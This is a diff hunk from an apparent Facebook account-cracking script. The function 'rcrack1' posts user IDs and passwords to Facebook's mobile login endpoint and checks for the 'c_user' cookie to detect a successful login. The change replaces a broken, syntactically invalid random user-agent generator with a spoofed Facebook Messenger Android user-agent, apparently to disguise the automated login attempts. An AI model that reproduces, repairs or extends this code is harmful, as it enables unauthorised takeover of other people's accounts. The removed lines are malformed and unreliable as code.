@@ -244,17 +244,7 @@ def rcrack1(uid,pwx,tl):
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
-           'user-agent':for txxxtt in range (1000):
-	                a='Mozilla/5.0 (Linux; Android'
-	                b=random.choice(['9','10','11','12','13','14','15'])
-	                c='Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	                d=random.randrange(40,115)
-                  	e='0'
-                 	f=random.randrange(3000,6000)
-	                g=random.randrange(20,100)
-	                h='Mobile Safari/537.36'
-	              ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
-	              ugen.append(ffg)
+           'user-agent':"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{densit)"
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
